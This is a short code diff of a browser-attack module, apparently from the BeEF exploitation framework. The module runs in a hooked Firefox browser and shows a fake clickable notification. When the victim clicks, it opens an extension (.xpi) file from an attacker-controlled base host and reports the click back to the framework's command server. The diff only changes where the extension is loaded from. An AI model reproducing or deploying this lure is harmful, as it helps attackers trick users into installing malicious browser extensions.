@@ -7,7 +7,7 @@
 beef.execute(function() {
 
     var xpi_name = '<%= @xpi_name %>';
-    var domain = '<%= @domain %>';
+    var base_host ='<%= @base_host %>';
     var ff_extension = '/' + xpi_name + '.xpi';
 
     if(beef.browser.isFF()){
@@ -28,7 +28,7 @@ beef.execute(function() {
                 $j(this).remove();
             });
             //window.location.href = ff_extension;
-            window.open(ff_extension);
+            window.open(base_host+ff_extension);
             beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=User has clicked the notification');
         });
         $j(hid).css('cursor','pointer');
